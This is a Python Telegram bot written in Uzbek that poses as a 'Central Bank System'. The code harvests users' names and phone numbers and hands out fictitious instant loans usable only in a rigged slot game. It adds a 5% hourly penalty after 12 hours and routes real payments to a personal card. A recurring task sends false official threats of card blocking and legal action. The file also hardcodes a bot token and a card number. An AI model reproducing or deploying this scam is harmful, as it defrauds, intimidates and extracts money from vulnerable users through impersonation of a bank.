import asyncio
import logging
import random
import json
import os
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- 1. SOZLAMALAR ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
ADMIN_ID = 8299021738
ADMIN_KARTA = "9860 6067 5582 9722"
DB_FILE = "bank_data.json"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

# --- 2. MA'LUMOTLAR BAZASI ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

users = load_db()

def get_u(uid):
    uid = str(uid)
    if uid not in users:
        users[uid] = {
            'name': '', 'phone': '', 'reg': False, 
            'balance': 0.0, 'loan': 0.0, 'loan_time': None
        }
    return users[uid]

# --- 3. HISOB-KITOB VA PENYA ---
def get_loan_status(uid):
    u = get_u(uid)
    if not u['loan'] or u['loan'] <= 0: return 0.0, 0.0, 0.0
    l_time = datetime.strptime(u['loan_time'], "%Y-%m-%d %H:%M:%S")
    passed_hours = (datetime.now() - l_time).total_seconds() / 3600
    penya = 0.0
    if passed_hours > 12:
        # Har soatga 5% penya (Shiddatli o'sish)
        penya = round(u['loan'] * 0.05 * (passed_hours - 12), 2)
    return float(u['loan']), penya, round(u['loan'] + penya, 2)

# --- 4. KLAVIATURALAR ---
def main_menu():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🎰 OMADLI O'YIN"), types.KeyboardButton(text="💰 BALANS"))
    builder.row(types.KeyboardButton(text="✨ TEZKOR QARZ OLISH ✨"))
    builder.row(types.KeyboardButton(text="💳 DEPOZIT"), types.KeyboardButton(text="🏦 QARZNI YOPISH"))
    return builder.as_markup(resize_keyboard=True)

# --- 5. RO'YXATDAN O'TISH (QAT'IY TIZIM) ---
@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    u = get_u(message.from_user.id)
    if not u['reg']:
        await message.answer("🏛 **MARKAZIY BANK TIZIMI**\n\nXizmatlardan foydalanish uchun Familiya va Ismingizni yozing:")
    else:
        await message.answer("Xush kelibsiz! Bank xizmatlaridan foydalanishingiz mumkin.", reply_markup=main_menu())

@dp.message(lambda m: not get_u(m.from_user.id)['reg'] and not m.contact)
async def process_reg(message: types.Message):
    uid = str(message.from_user.id)
    if not users[uid]['name']:
        users[uid]['name'] = message.text
        save_db(users)
        
        builder = ReplyKeyboardBuilder()
        builder.row(types.KeyboardButton(text="📱 RAQAMNI TASDIQLASH", request_contact=True))
        await message.answer(
            f"Rahmat, {message.text}!\nEndi pastdagi tugmani bosib telefon raqamingizni tasdiqlang.\n\n"
            "⚠️ *Eslatma: Raqamni qo'lda yozish taqiqlanadi!*", 
            reply_markup=builder.as_markup(resize_keyboard=True), parse_mode="Markdown"
        )
    else:
        await message.answer("⚠️ Iltimos, pastdagi tugmani bosing!")

@dp.message(F.contact)
async def contact_handler(message: types.Message):
    uid = str(message.from_user.id)
    if message.contact.user_id == message.from_user.id:
        users[uid]['phone'] = message.contact.phone_number
        users[uid]['reg'] = True
        save_db(users)
        await message.answer("✅ Shaxsingiz tasdiqlandi. Kredit limiti faollashtirildi.", reply_markup=main_menu())
        await bot.send_message(ADMIN_ID, f"🔔 YANGI MIJOZ: {users[uid]['name']} | {users[uid]['phone']}")
    else:
        await message.answer("❌ Faqat o'zingizning kontaktingizni yuboring!")

# --- 6. JOZIBADOR QARZ OLISH ---
@dp.message(F.text == "✨ TEZKOR QARZ OLISH ✨")
async def loan_offer(message: types.Message):
    u = get_u(message.from_user.id)
    if u['loan'] > 0:
        return await message.answer("❌ Sizda to'lanmagan qarz mavjud. Avvalgisini yopishingiz shart!")
    
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="💰 500,000 UZS", callback_data="get_500"))
    kb.row(types.InlineKeyboardButton(text="💰 1,000,000 UZS", callback_data="get_1000"))
    kb.row(types.InlineKeyboardButton(text="💎 2,500,000 UZS (VIP)", callback_data="get_2500"))
    
    await message.answer(
        "🌟 **MAXSUS KREDIT TAKLIFI** 🌟\n\n"
        "Siz uchun bankimiz tomonidan imtiyozli qarz ajratildi:\n"
        "🔹 12 soat foizsiz muddat\n"
        "🔹 Tezkor o'tkazma\n"
        "🔹 Kredit tarixi 2x yaxshilanadi\n\n"
        "Kerakli miqdorni tanlang:", reply_markup=kb.as_markup()
    )

@dp.callback_query(F.data.startswith("get_"))
async def process_loan(call: types.CallbackQuery):
    uid = str(call.from_user.id)
    amt = int(call.data.split("_")[1]) * 1000
    users[uid]['loan'] = float(amt)
    users[uid]['balance'] += float(amt)
    users[uid]['loan_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_db(users)
    await call.message.edit_text(f"✅ Hisobingizga {amt:,.0f} UZS muvaffaqiyatli tushirildi!")

# --- 7. ADMIN TASDIQLASH (DEPOZIT VA TO'LOV) ---
@dp.message(F.text.in_(["💳 DEPOZIT", "🏦 QARZNI YOPISH"]))
async def pay_start(message: types.Message):
    mode = "DEP" if "DEPOZIT" in message.text else "PAY"
    l, p, total = get_loan_status(message.from_user.id)
    if mode == "PAY" and total <= 0: return await message.answer("Sizda qarz majburiyati yo'q.")
    
    users[str(message.from_user.id)]['waiting'] = mode
    txt = "Depozit summasini yozing:" if mode == "DEP" else f"Qarz: {total:,.2f} UZS. To'lov summasini yozing:"
    await message.answer(f"💳 Karta: `{ADMIN_KARTA}`\n\n{txt}", parse_mode="Markdown")

@dp.message(lambda m: get_u(m.from_user.id).get('waiting'))
async def pay_request(message: types.Message):
    uid = str(message.from_user.id)
    mode = users[uid].pop('waiting')
    try:
        amt = float(re.sub(r'\D', '', message.text))
        kb = InlineKeyboardBuilder()
        kb.row(types.InlineKeyboardButton(text="✅ TASTIQLASH", callback_data=f"adm_ok_{mode}_{uid}_{amt}"),
               types.InlineKeyboardButton(text="❌ RAD ETISH", callback_data=f"adm_no_{uid}"))
        await bot.send_message(ADMIN_ID, f"📥 TO'LOV ({mode}): {amt:,.2f}\n👤 Mijoz: {users[uid]['name']}", reply_markup=kb.as_markup())
        await message.answer("⌛️ So'rov yuborildi. Admin tasdiqlashini kuting...")
    except: await message.answer("Faqat sonlarda kiriting!")

@dp.callback_query(F.data.startswith("adm_"))
async def admin_decision(call: types.CallbackQuery):
    d = call.data.split("_")
    status, mode, uid, amt = d[1], d[2], d[3], float(d[4] if len(d)>4 else 0)
    if status == "ok":
        if mode == "DEP": users[uid]['balance'] += amt
        else: users[uid]['loan'] = 0.0; users[uid]['loan_time'] = None
        save_db(users)
        await bot.send_message(uid, "✅ Tranzaksiya tasdiqlandi. Hisobingiz yangilandi!")
    else: await bot.send_message(uid, "❌ To'lov rad etildi.")
    await call.message.edit_text(f"Natija: {status}")

# --- 8. O'YIN VA BALANS ---
@dp.message(F.text == "🎰 OMADLI O'YIN")
async def play_game(message: types.Message):
    u = get_u(message.from_user.id)
    if u['balance'] < 100000: return await message.answer("⚠️ O'yin uchun balans kam (Min: 100,000 UZS).")
    u['balance'] -= 100000
    msg = await message.answer_dice("🎰")
    await asyncio.sleep(3.5)
    if random.random() < 0.15: # 15% Win rate
        win = round(random.uniform(120000, 300000), 2)
        u['balance'] += win
        await message.answer(f"🎉 YUTUQ! +{win:,.2f} UZS")
    else: await message.answer("😟 Omad kelmadi. Yana urinib ko'ring!")
    save_db(users)

@dp.message(F.text == "💰 BALANS")
async def show_bal(message: types.Message):
    l, p, total = get_loan_status(message.from_user.id)
    u = get_u(message.from_user.id)
    await message.answer(f"💵 Hisob: {u['balance']:,.2f} UZS\n🛑 Qarz: {total:,.2f} UZS\n(Penya: {p:,.2f})")

# --- 9. AVTOMATIK OGOHLANTIRISH ---
async def notification_task():
    while True:
        await asyncio.sleep(14400) # Har 4 soatda
        for uid, u in users.items():
            l, p, total = get_loan_status(uid)
            if p > 0:
                try:
                    await bot.send_message(uid, 
                        f"🚨 **DIQQAT: RASMIY OGOHLANTIRISH**\n\n"
                        f"Qarzingiz {total:,.2f} UZS ga yetdi. "
                        f"To'lanmasa, bank kartalaringiz bloklanadi va qonuniy choralar ko'riladi.", parse_mode="Markdown")
                except: pass

async def main():
    asyncio.create_task(notification_task())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())

